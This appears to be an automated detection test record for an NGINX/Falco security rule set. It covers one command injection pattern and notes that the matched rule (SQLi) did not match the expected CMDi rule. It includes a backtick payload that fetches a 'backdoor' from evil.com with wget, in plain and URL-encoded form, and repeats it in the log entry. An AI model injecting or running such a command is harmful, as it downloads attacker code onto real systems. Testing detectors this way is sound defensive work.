name: test_e2e_with_logs[265_CMD_BACK_002]
description:
## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BACK_002` |
| **Name** | Malicious download via backticks |
| **Category** | CMDI |
| **Subcategory** | backtick |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: ``wget http://evil.com/backdoor``
- **Encoded**: `%60wget%20http%3A%2F%2Fevil.com%2Fbackdoor%60`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~13000ms
- **Timestamp**: 12:36:13.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_002-1769862973143-4b0v8fo pattern_id=CMD_BACK_002 uri=/?q=%60wget%20http%3A%2F%2Fevil.com%2Fbackdoor%60 client=127.0.0.1 method=GET` |
| **Rule Match** | ❌ Mismatch |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_002-1769862973143-4b0v8fo pattern_id=CMD_BACK_002 uri=/?q=%60wget%20http%3A%2F%2Fevil.com%2Fbackdoor%60 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:36:13.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_002-1769862973143-4b0v8fo pattern_id=CMD_BACK_002 uri=/?q=%60wget%20http%3A%2F%2Fevil.com%2Fbackdoor%60 client=127.0.0.1 method=GET
```
